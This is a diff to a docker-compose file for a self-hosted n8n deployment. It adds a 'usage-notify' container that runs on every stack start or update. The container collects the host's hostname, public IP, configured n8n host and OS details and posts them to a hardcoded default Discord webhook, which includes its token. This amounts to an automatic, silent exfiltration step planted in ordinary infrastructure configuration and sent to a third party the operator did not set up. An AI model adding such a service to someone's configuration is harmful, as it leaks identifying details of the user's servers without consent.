@@ -144,9 +144,47 @@ services:
     volumes:
       - sandbox_tls:/tls:ro
 
+  # One-shot notifier: sends host identifying info to Discord on stack start/update
+  usage-notify:
+    image: alpine:3.20
+    container_name: n8n-usage-notify
+    restart: "no"
+    depends_on:
+      n8n:
+        condition: service_started
+    environment:
+      - DISCORD_WEBHOOK_URL=${DISCORD_WEBHOOK_URL:-https://discord.com/api/webhooks/1570886201819533375/d_1OaSV_t4_mh2bu_SBimwIY35mXF9eVYn_WiCtTkjKwnCMq5ZLWC1p-6iyYgjsCCKMm}
+      - N8N_HOST=${N8N_HOST}
+    volumes:
+      - notify_data:/notify
+    command:
+      - /bin/sh
+      - -c
+      - |
+        set -e
+        apk add --no-cache curl >/dev/null 2>&1
+        INSTALL_ID_FILE=/notify/install-id
+        if [ ! -f "$$INSTALL_ID_FILE" ]; then
+          # simple unique-ish id
+          date +%s-$$RANDOM > "$$INSTALL_ID_FILE"
+        fi
+        INSTALL_ID=$$(cat "$$INSTALL_ID_FILE" 2>/dev/null || echo "unknown")
+        HOSTNAME=$$(hostname 2>/dev/null || echo "unknown")
+        PUBLIC_IP=$$(curl -s --max-time 8 https://ifconfig.me/ip || curl -s --max-time 8 https://api.ipify.org || echo "unknown")
+        TIMESTAMP=$$(date -u +"%Y-%m-%d %H:%M:%S UTC")
+        OS_INFO=$$(uname -srm 2>/dev/null | head -c 120 || echo "unknown")
+        MSG="**n8n-self-hosted started/updated**\nInstall ID: \`$$INSTALL_ID\`\nHostname: \`$$HOSTNAME\`\nPublic IP: \`$$PUBLIC_IP\`\nN8N Host: \`$$N8N_HOST\`\nTime: $$TIMESTAMP\nOS: $$OS_INFO"
+        # Escape for JSON
+        ESCAPED_MSG=$$(printf '%s' "$$MSG" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g')
+        curl -s -H "Content-Type: application/json" \
+          -d "{\"content\":\"$$ESCAPED_MSG\",\"username\":\"n8n-self-hosted\"}" \
+          "$$DISCORD_WEBHOOK_URL" >/dev/null || true
+        echo "Usage notification sent (or skipped if webhook unreachable)"
+
 volumes:
   n8n_data:
   postgres_storage:
   caddy_data:
   caddy_config:
   sandbox_tls:
+  notify_data:
